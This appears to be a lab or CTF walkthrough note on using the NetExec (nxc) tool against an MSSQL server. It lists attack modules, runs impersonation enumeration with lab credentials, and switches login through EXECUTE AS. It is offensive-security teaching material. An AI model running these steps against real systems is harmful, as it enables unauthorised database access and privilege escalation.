
# nxc

---
## PoC

For example we can utilize nxc once we got credentials and check which modules we can use for mssql service.

```
nxc mssql 192.168.209.40 -u discovery -p 'Start123!' -L     
LOW PRIVILEGE MODULES
[*] enum_impersonate          Enumerate users with impersonation privileges
[*] enum_logins               Enumerate SQL Server logins
[*] exec_on_link              Execute commands on a SQL Server linked server
[*] link_enable_xp            Enable or disable xp_cmdshell on a linked SQL server
[*] link_xpcmd                Run xp_cmdshell commands on a linked SQL server
[*] mssql_coerce              Execute arbitrary SQL commands on the target MSSQL server
[*] mssql_priv                Enumerate and exploit MSSQL privileges

HIGH PRIVILEGE MODULES (requires admin privs)
[*] empire_exec               Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
[*] enum_links                Enumerate linked SQL Servers and their login configurations.
[*] met_inject                Downloads the Meterpreter stager and injects it into memory
[*] nanodump                  Get lsass dump using nanodump and parse the result with pypykatz
[*] test_connection           Pings a host
[*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
```

Checking if we can impersonate an user using our current user within mssql.

```
nxc mssql 192.168.209.40 -u discovery -p 'Start123!' -M enum_impersonate
MSSQL       192.168.209.40  1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:hokkaido-aerospace.com)
MSSQL       192.168.209.40  1433   DC               [+] hokkaido-aerospace.com\discovery:Start123! 
ENUM_IMP... 192.168.209.40  1433   DC               [+] Users with impersonation rights:
ENUM_IMP... 192.168.209.40  1433   DC               [*]   - hrappdb-reader
```

Logging into user in mssql.

```
EXECUTE AS LOGIN = 'hrappdb-reader'
```